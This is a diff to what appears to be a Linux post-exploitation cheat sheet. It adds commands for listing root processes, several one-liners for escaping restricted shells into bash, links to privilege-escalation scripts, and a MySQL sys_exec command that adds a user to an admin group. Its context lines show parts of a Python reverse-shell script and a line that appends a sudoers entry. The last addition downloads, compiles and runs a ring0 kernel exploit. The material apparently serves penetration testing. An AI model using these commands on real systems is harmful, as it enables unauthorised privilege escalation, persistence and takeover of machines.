@@ -21,7 +21,32 @@ Post exploitation
     Command to skip ignored lines in config files
     *$ alias nonempty="egrep -v '^[ \t]*#|^$'"*
 
+Services information
+    The following command will list processes running by root, permissions and NFS exports.
+    *$ echo 'services runnig as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null*
+
+Escaping limited interpreters
+    *:!bash
+:set shell=/bin/bash:shell
+!bash
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
+awk 'BEGIN {system("/bin/bash")}'
+--interactive
+echo "os.execute('/bin/sh')"
+sudo nmap --script=exploit.nse	nmap (thanks to comment by anonymous below)
+perl -e 'exec "/bin/bash";'*
+
+
 Linux elevation of privileges
+    Scripts to run
+    *https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh*
+
+
+   If Mysql is running as root, you can run commands using *sys_exec()*. For instance, to add user to sudoers:
+   *sys_exec('usermod -a -G admin username')*
+   More about mysql:
+   *https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/*
 
     Find linux distribution & version
     *$ cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;*
@@ -89,9 +114,6 @@ It works*
     Find nobody owned files
     *$ find /dir -xdev \( -nouser -o -nogroup \) -print*
 
-    Other scripts
-    *https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py*
-
     Reverse shell with python script:
     *#!/usr/bin/python
 import socket,subprocess,os
@@ -110,3 +132,6 @@ try:
         os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
 except:
         sys.exit()*
+
+    Ring0 kernel exploit for 2.3/2.4
+    *wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -m32 -o ring0; chmod +x ring0; ./ring0*
